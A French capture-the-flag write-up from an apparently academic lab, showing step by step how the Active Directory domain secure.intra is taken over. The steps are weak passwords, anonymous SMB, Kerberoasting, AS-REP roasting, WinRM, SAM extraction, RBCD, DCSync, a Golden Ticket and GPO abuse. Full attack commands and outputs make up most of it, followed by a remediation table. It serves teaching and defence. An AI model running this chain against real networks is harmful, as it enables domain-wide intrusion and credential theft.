---
titre: "CTF Active Directory"
description: "Compromission progressive d'un domaine Active Directory, d'un mot de passe faible jusqu'au contrôle total du contrôleur de domaine."
resume: "On compromet un domaine Active Directory, d'un simple mot de passe faible jusqu'au contrôle total du contrôleur de domaine. Ce write-up enchaîne une dizaine de challenges (énumération, Kerberoasting, AS-REP Roasting, RBCD, Golden Ticket, GPO), puis en tire les leçons de défense."
date: "18.09.2026"
plateforme: "Lab M2"
categorie: "Active Directory"
difficulte: "Hard"
---

## Contexte

Ce CTF interne (M2 Cyber) est un lab pédagogique Active Directory. Le domaine cible est `secure.intra` et le poste attaquant est une machine Kali sur le même réseau. L'objectif est de compromettre progressivement le domaine, du simple mot de passe faible jusqu'au contrôle total du contrôleur de domaine.

## Cartographie de l'environnement

| Hôte | IP | Rôle |
| --- | --- | --- |
| `WIN-VOPS298ID4C` | `192.168.0.200` | Contrôleur de domaine (`secure.intra`), DNS, KDC |
| `WIN-1A8S89ANNRT` | `192.168.0.150` | Serveur Windows membre |
| `DESKTOP-6RF7HK7` | `192.168.0.201` | Poste de travail (partage SMB anonyme) |
| `SAUVEGARDE01` | `192.168.0.240` | Serveur de sauvegarde |
| `kali-rebond` | `192.168.0.61` | Machine de pivot |
| Kali (moi) | `192.168.0.7` | Poste attaquant |

Comptes du domaine découverts : `Administrateur`, `Invité`, `krbtgt`, `mssqluser`, `Pierre`, `John`, `Varonis`, `Install`, `Welcome`.

## Reconnaissance

### Découverte des hôtes

```bash
ip a                       # Réseau 192.168.0.0/24, IP locale 192.168.0.7
nmap -sn 192.168.0.0/24    # Ping scan
```

```text
192.168.0.150 - WIN-1A8S89ANNRT   <- serveur Windows
192.168.0.201 - DESKTOP-6RF7HK7   <- poste Windows
192.168.0.200 - WIN-VOPS298ID4C   <- contrôleur de domaine
192.168.0.61  - kali-rebond       <- pivot
```

`-sn` fait une simple vérification de présence (ping), sans énumérer les services. On obtient rapidement la liste des cibles.

### Scan de ports

```bash
nmap -Pn -p- --min-rate 1000 192.168.0.150
```

```text
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman        <- WinRM
47001/tcp open  winrm
```

`-Pn` considère l'hôte comme vivant (pas de découverte préalable), `-p-` scanne les 65535 ports, `--min-rate 1000` accélère. Le DC (`.200`) sera identifié par le port 88 (kerberos-sec).

### Énumération SMB

> [!note] SMB (Server Message Block)
> Protocole de partage de fichiers et d'imprimantes sur le réseau local (TCP 445). C'est une surface d'énumération et d'attaque importante sous Windows.

```bash
nxc smb 192.168.0.150 192.168.0.201
```

```text
SMB   192.168.0.150   445   WIN-1A8S89ANNRT   [*] ... (signing:False) (SMBv1:False)
SMB   192.168.0.201   445   DESKTOP-6RF7HK7   [*] ... (signing:False) (Null Auth:True)   <- auth anonyme
```

Deux observations exploitables ici. La signature SMB est désactivée (relais possible) et `.201` accepte les connexions anonymes (Null Auth: True).

## Mot de passe faible (LDAP)

> "Certains utilisateurs ne comprendront jamais…" Le flag est le MD5 du mot de passe trouvé.

### Concept

Un mot de passe trivial (identique au nom d'utilisateur, mot du dictionnaire) reste la porte d'entrée la plus fréquente en AD. Avec un premier compte valide, on peut interroger LDAP pour énumérer tout l'annuaire (comptes, descriptions, dates de mot de passe).

### Exploitation

```bash
nxc ldap 192.168.0.200 -u Welcome -p Welcome123 --users
```

```text
LDAP   192.168.0.200   389   WIN-VOPS298ID4C   [+] secure.intra\Welcome:Welcome123
LDAP   192.168.0.200   389   WIN-VOPS298ID4C   [*] Enumerated 9 domain users: secure.intra
   Administrateur   ...  Compte d'administration
   krbtgt           ...  Compte de service du KDC
   mssqluser        ...
   John             ...  <- mot de passe = "John"
   ...
```

Le compte `John` a un mot de passe identique à son login (`John:John`).

**Le flag est le MD5 du mot de passe `John`.**

```bash
echo "John" | md5sum
```

## Accès anonyme SMB

> "Accès anonyme au partage de fichiers." Le flag est le contenu de `flag.txt`.

### Concept

Un partage accessible en session nulle (`-N`, sans identifiant) expose ses fichiers à quiconque atteint le port 445. C'est une mauvaise configuration classique.

### Exploitation

```bash
smbclient -L //192.168.0.201/ -N        # liste des partages, sans authentification
```

```text
Sharename   Type   Comment
ADMIN$      Disk   Administration à distance
C$          Disk   Partage par défaut
John        Disk                          <- partage non standard
```

```bash
smbclient //192.168.0.201/John -N
smb: \> ls
  Compte.txt   ...
  flag.txt     ...
  Todo.txt     ...
smb: \> get flag.txt
```

Les autres fichiers du partage donnent du contexte réutilisable plus tard.

```text
# Compte.txt
Le compte AD par défaut pour se connecter :
Welcome:Welcome123

# Todo.txt
- Accès winrm a la machine avec mon compte : Fait      <- indice pour la partie WinRM
- Sécuriser le serveur de backup : Fait
- Activer et sécuriser les services correctement sur le poste : A faire
```

**Le flag est le contenu de `flag.txt`.**

## Compte de service (Kerberoasting)

> "Un utilisateur avec un SPN…" Le flag est le MD5 du mot de passe.

### Concept

Le Kerberoasting cible les comptes disposant d'un SPN (Service Principal Name). N'importe quel utilisateur authentifié peut demander au KDC un ticket de service (TGS) pour ce SPN. Une partie du ticket est chiffrée avec la clé dérivée du mot de passe du compte de service, que l'on casse hors ligne. Les comptes de service ont souvent des mots de passe faibles et rarement changés.

### Exploitation

```bash
# Identification du DC (port 88 = KDC)
nmap -Pn -p 88 --open 192.168.0.0/24     # -> WIN-VOPS298ID4C (192.168.0.200)

# Demande des TGS des comptes à SPN, écrits dans kerb.txt
nxc ldap 192.168.0.200 -u Welcome -p Welcome123 --kerberoasting kerb.txt

# Synchronisation d'horloge (Kerberos rejette un décalage supérieur à ~5 min)
sudo ntpdate 192.168.0.200

# Cassage hors ligne, -m 13100 = Kerberos 5 TGS-REP (etype 23)
hashcat -m 13100 kerb.txt rockyou-75.txt
```

```text
mssqluser:Password1
```

Le compte `mssqluser` (compte de service SQL avec SPN) a pour mot de passe `Password1`.

**Le flag est le MD5 du mot de passe `Password1`.**

## Pas de pré-authentification (AS-REP Roasting)

> "Pas de pré-authentification ?" Le flag est le MD5 du mot de passe.

### Concept

L'AS-REP Roasting cible les comptes ayant l'attribut `UF_DONT_REQUIRE_PREAUTH` ("Do not require Kerberos pre-authentication"). Normalement, la pré-authentification oblige le client à prouver qu'il connaît le mot de passe avant que le KDC ne réponde. Sans elle, n'importe qui peut demander un AS-REP. Une portion est chiffrée avec la clé dérivée du mot de passe, donc cassable hors ligne.

### Exploitation

```bash
# Construction de la liste d'utilisateurs (issue de l'énumération LDAP)
printf '%s\n' Administrateur Invité krbtgt mssqluser Pierre John Varonis Install Welcome > users.txt

# -request (récupère les hash des comptes vulnérables), -format hashcat (format cassable)
GetNPUsers.py secure.intra/ -usersfile users.txt -dc-ip 192.168.0.200 \
  -request -format hashcat -outputfile asrep.txt
```

```text
[-] User Administrateur doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$Pierre@SECURE.INTRA:c35d5c70...       <- seul Pierre est vulnérable
[-] User John doesn't have UF_DONT_REQUIRE_PREAUTH set
...
```

```bash
# -m 18200 = Kerberos 5 AS-REP (etype 23)
hashcat -m 18200 asrep.txt rockyou-75.txt
```

```text
Pierre:butterfly
```

Seul `Pierre` a la pré-authentification désactivée, il est donc AS-REP-roastable.

**Le flag est le MD5 du mot de passe `butterfly`.**

> [!note] Kerberoasting ou AS-REP Roasting
> Le Kerberoasting cible un SPN (TGS-REP, mode 13100), l'AS-REP Roasting cible l'absence de pré-authentification (AS-REP, mode 18200). Deux faiblesses Kerberos distinctes, deux modes hashcat différents.

## WinRM

> "Accès via WinRM."

### Concept

WinRM (Windows Remote Management, port 5985) permet l'administration distante en PowerShell. Un compte disposant des droits *Remote Management Users* peut obtenir un shell distant. Le `Todo.txt` trouvé précédemment indiquait déjà "Accès winrm à la machine avec mon compte : Fait".

### Exploitation

```bash
# --local-auth (authentification locale à la machine)
nxc winrm 192.168.0.201 -u John -p John --local-auth
```

```text
WINRM   192.168.0.201   5985   DESKTOP-6RF7HK7   [+] DESKTOP-6RF7HK7\John:John (Pwn3d!)
```

Le `(Pwn3d!)` confirme l'accès. On ouvre un shell interactif.

```bash
evil-winrm-py -i 192.168.0.201 -u John -p 'John'
```

On obtient un shell sur `DESKTOP-6RF7HK7` en tant que `John`. Cet accès permet ensuite d'extraire les ruches de registre `SAM` et `SYSTEM`.

## SAM (hash NT local)

> "Le flag est le hash NT de l'administrateur."

### Concept

La base SAM (Security Account Manager) stocke les hash NTLM des comptes locaux d'une machine. Elle est chiffrée avec une clé (le bootkey ou SYSKEY) dérivée de la ruche `SYSTEM`. En récupérant les deux ruches via l'accès WinRM obtenu, on déchiffre les hash hors ligne.

### Exploitation

```bash
# LOCAL (traite les fichiers de ruches extraits, pas une cible distante)
secretsdump.py -sam sam.bak -system system.bak LOCAL
```

```text
[*] Target system bootKey: 0x44784f2fe5cd2d0a7839cd8086fcd05f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrateur:500:aad3b435...:<hash NT Administrateur>:::   <- flag
John:1001:aad3b435...:f0cff78ea8d2d87e5d1caccf01d0bd2f:::
Install:1002:aad3b435...:122fb9fe2b172fcf36b5168cb2495815:::  <- pour le RBCD
...
```

**Le flag est le hash NT de l'Administrateur local.**

> [!note] Pour la suite
> Le hash NT du compte `Install` (`122fb9fe...`) récupéré ici permet la suite de l'attaque. Il servira pour le RBCD.

## ACL et RBCD

> "Un utilisateur avec des droits un peu trop élevés sur de multiples machines." À valider avec une démonstration d'exploitation.

### Concept du RBCD (Resource-Based Constrained Delegation)

Le compte `Install` possède un contrôle total (FullControl) sur l'objet machine du DC (`WIN-VOPS298ID4C$`). Le principe du RBCD se fait en trois temps.

1. On crée un compte machine que l'on contrôle (`TEST$`).
2. Grâce au FullControl, on écrit sur le DC qu'il fait confiance à `TEST$` pour agir au nom d'autres utilisateurs (attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`).
3. Avec `TEST$`, on demande à Kerberos (via S4U2Self puis S4U2Proxy) un ticket de service en usurpant l'Administrateur sur le DC, ce qui donne un accès SYSTEM.

### Exploitation

Étape 1, vérifier que le hash d'`Install` s'authentifie et lire le MachineAccountQuota.

```bash
nxc smb 192.168.0.150 192.168.0.201 192.168.0.200 -u Install -H 122fb9fe2b172fcf36b5168cb2495815
nxc ldap 192.168.0.200 -u Install -H 122fb9fe2b172fcf36b5168cb2495815 -M maq
```

```text
SMB    192.168.0.200   445   WIN-VOPS298ID4C   [+] secure.intra\Install:122fb9fe...   (DC:True)
MAQ    192.168.0.200   389   WIN-VOPS298ID4C   MachineAccountQuota: 10
```

Le `MachineAccountQuota: 10` autorise un utilisateur standard à créer jusqu'à 10 comptes machine.

Étape 2, créer le compte machine contrôlé.

```bash
bloodyAD --host 192.168.0.200 -d secure.intra -u Install -p ':122fb9fe2b172fcf36b5168cb2495815' \
  add computer 'TEST' 'Test123#'
```

Étape 3, écrire la relation de délégation.

```bash
rbcd.py -delegate-from 'TEST$' -delegate-to 'WIN-VOPS298ID4C$' -action write \
  -hashes :122fb9fe2b172fcf36b5168cb2495815 secure.intra/Install -dc-ip 192.168.0.200
```

`-delegate-from` est le compte contrôlé, `-delegate-to` la machine visée, `-action write` l'inscription dans `msDS-AllowedToActOnBehalfOfOtherIdentity`.

Étape 4, forger le ticket en usurpant l'Administrateur.

```bash
sudo ntpdate 192.168.0.200          # resynchronisation d'horloge
unset KRB5CCNAME                     # on repart d'un cache propre

getST.py -spn cifs/WIN-VOPS298ID4C.secure.intra -impersonate Administrateur \
  -dc-ip 192.168.0.200 'secure.intra/TEST$:Test123#'
```

`-spn cifs/...` cible le service d'accès SMB de la machine, `-impersonate` demande le ticket au nom de l'Administrateur.

Étape 5, démontrer l'exécution en tant qu'Administrateur du domaine.

```bash
export KRB5CCNAME=Administrateur@cifs_WIN-VOPS298ID4C.secure.intra@SECURE.INTRA.ccache
nxc smb WIN-VOPS298ID4C.secure.intra -u Administrateur -k --use-kcache -x "whoami"

# Shell SYSTEM interactif (psexec crée un service distant -> NT AUTHORITY\SYSTEM)
psexec.py -k -no-pass WIN-VOPS298ID4C.secure.intra
C:\Windows\system32> whoami
autorite nt\système
```

**Contrôle total du DC obtenu (`NT AUTHORITY\SYSTEM` sur le contrôleur de domaine).** `-k` est l'authentification Kerberos par ticket, `-no-pass` signifie qu'aucun mot de passe n'est nécessaire car le ticket suffit.

## Golden Ticket

> "Forger un Golden Ticket et l'importer dans votre Kali." (indice : KRBTGT)

### Concept

Le compte `krbtgt` détient la clé qui signe tous les tickets Kerberos du domaine. Si on possède son hash, alors on peut forger un TGT arbitraire (Golden Ticket). Le DC le considèrera comme authentique puisqu'il est signé avec sa propre clé. On peut alors devenir n'importe quel utilisateur, même inexistant, avec les privilèges de son choix. C'est une persistance de niveau domaine.

### Exploitation

Étape 1, extraire le hash de `krbtgt` par DCSync, via l'accès admin obtenu par le RBCD.

```bash
sudo ntpdate 192.168.0.200
secretsdump.py -k -no-pass WIN-VOPS298ID4C.secure.intra -just-dc-user krbtgt
```

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435...:d6be34c05d536eab311a578824b40514:::   <- clé de signature du domaine
```

Étape 2, récupérer le SID du domaine.

```bash
nxc ldap 192.168.0.200 -u Install -H 122fb9fe2b172fcf36b5168cb2495815 \
  --query "(objectClass=domain)" "objectSid"
```

Étape 3, forger le Golden Ticket.

```bash
ticketer.py -nthash d6be34c05d536eab311a578824b40514 \
  -domain-sid S-1-5-21-2931287595-4144871426-66956829 \
  -domain secure.intra Administrateur
```

`-nthash` est le hash krbtgt (la signature), `-domain-sid` le SID du domaine.

Étape 4, importer et vérifier.

```bash
export KRB5CCNAME=Administrateur.ccache
klist
```

```text
Default principal: Administrateur@SECURE.INTRA
Valid starting       Expires
18/09/2026 08:58:51  15/09/2036 08:58:51   krbtgt/SECURE.INTRA@SECURE.INTRA
```

> [!tip] Signature d'un Golden Ticket
> La validité est de 10 ans (2026 à 2036). Un vrai TGT ne dure que ~10 h. Cette durée anormale est la valeur par défaut de `ticketer` et un bon indicateur de détection côté défense.

Étape 5, prouver l'exécution avec le ticket forgé.

```bash
nxc smb WIN-VOPS298ID4C.secure.intra -u Administrateur -k --use-kcache -x "whoami"
psexec.py -k -no-pass WIN-VOPS298ID4C.secure.intra
C:\Windows\system32> whoami
autorite nt\système
```

**Exécution sur le DC en tant qu'Administrateur, uniquement grâce à un ticket fabriqué.** Contrôle définitif du domaine.

## GPO

> "Prenez le contrôle de la machine SAUVEGARDE01."

### Concept

Une GPO (Group Policy Object) liée à une OU (Organizational Unit) s'applique à tous les objets de cette OU. Si on peut modifier une GPO liée, alors on peut y injecter, par exemple, une tâche planifiée qui s'exécute en SYSTEM sur les machines ciblées et ainsi en prendre le contrôle. La cible `SAUVEGARDE01` est dans l'OU `GPOdeVal`.

### Énumération réalisée

```bash
nslookup SAUVEGARDE01.secure.intra 192.168.0.200      # -> 192.168.0.240

# Hash NT de l'Administrateur du domaine (DCSync)
secretsdump.py -k -no-pass WIN-VOPS298ID4C.secure.intra -just-dc-user Administrateur

# DN de la cible, puis GPO liée à l'OU (attribut gPLink)
nxc ldap WIN-VOPS298ID4C.secure.intra -u Administrateur -H 9e29b8729a1712e6c7967248b8b21b28 \
  --query "(name=SAUVEGARDE01)" "distinguishedName"
```

```text
CN=SAUVEGARDE01,OU=GPOdeVal,DC=secure,DC=intra
gPLink   [LDAP://cn={F38172D4-...},cn=policies,...;2]
```

L'OU `GPOdeVal` est liée à la GPO `{F38172D4-...}`, dont le nom est `Flux_Sauvegarde`.

### Étape restante

Avec le contrôle du domaine obtenu par le RBCD et le Golden Ticket, la suite logique consiste à abuser de la GPO `Flux_Sauvegarde` liée à l'OU `GPOdeVal`. Avec `pyGPOAbuse` ou `SharpGPOAbuse`, on peut y déposer une tâche exécutée en SYSTEM sur `SAUVEGARDE01`, puis forcer l'application (`gpupdate`). Cette étape d'exploitation n'est pas encore finalisée dans mes notes.

> [!note] Mouvement latéral par GPO
> Même sans nouvel accès, un attaquant Domain Admin peut se propager latéralement de façon "légitime" via les GPO. D'où l'importance d'auditer qui peut éditer chaque GPO.

## Chaînage global des attaques

Voici l'enchaînement des challenges.

```text
Welcome:Welcome123 (partage anonyme SMB)
        |  énumération LDAP
        .
Comptes du domaine -> Kerberoasting mssqluser
                   -> AS-REP Roasting Pierre
        |
        .
John:John -> WinRM sur DESKTOP-6RF7HK7
        |  extraction SAM/SYSTEM
        .
Hash NT local d'Install
        |  Install a FullControl sur le DC
        .
RBCD, impersonation Administrateur -> SYSTEM sur le DC
        |  DCSync
        |-- hash krbtgt -> Golden Ticket (persistance domaine)
        |-- GPO Flux_Sauvegarde -> SAUVEGARDE01
```

Une faiblesse mineure (mot de passe faible, partage anonyme) sert d'entrée et c'est l'accumulation de mauvaises configurations qui transforme un accès trivial en compromission totale.

## Synthèse, remédiation et leçons

| Faiblesse | Remédiation |
| --- | --- |
| Mots de passe faibles, login égal au mot de passe | Politique de mots de passe robuste, MFA, bannir les mots de passe triviaux (filtres type PassFilter) |
| Partage SMB anonyme | Désactiver les sessions nulles, restreindre les ACL de partage, auditer les partages exposés |
| Compte de service SPN à mot de passe faible | gMSA (mots de passe complexes changés automatiquement), AES only, surveiller les demandes massives de TGS (événement `4769`) |
| Pré-authentification Kerberos désactivée | Ne jamais cocher "Do not require pre-authentication", auditer cet attribut régulièrement |
| WinRM largement ouvert | Restreindre *Remote Management Users*, segmentation réseau, journalisation WinRM |
| Hash NT locaux réutilisables (Pass-the-Hash) | LAPS (mot de passe admin local unique par machine), Credential Guard, tiering administratif |
| ACL excessives (FullControl sur le DC) | Moindre privilège, audit des ACL sensibles (BloodHound), réduire `MachineAccountQuota` à 0 |
| RBCD | Protéger les objets sensibles, placer les comptes privilégiés dans *Protected Users* |
| Golden Ticket (krbtgt) | Après compromission, réinitialiser `krbtgt`, surveiller les TGT à durée anormale, AES |
| Édition de GPO liée à une OU | Auditer les droits d'écriture sur chaque GPO, alerter sur les modifications de `gPLink` |

### Ce que ce CTF apprend

- **La compromission d'AD est souvent une chaîne, pas un exploit isolé.** Chaque petit accès en débloque un plus grand.
- **Kerberos concentre plusieurs surfaces.** Kerberoasting (SPN), AS-REP Roasting (pré-auth), délégation (RBCD), forge de tickets (Golden Ticket).
- **Les ACL sont importantes.** Un FullControl mal placé sur le DC vaut toutes les CVE.
- **Le compte `krbtgt`, ce sont les clés du royaume.** Sa compromission impose une remédiation lourde.
- **La synchronisation d'horloge est un prérequis** de toute attaque Kerberos (`ntpdate` avant chaque manipulation de ticket).
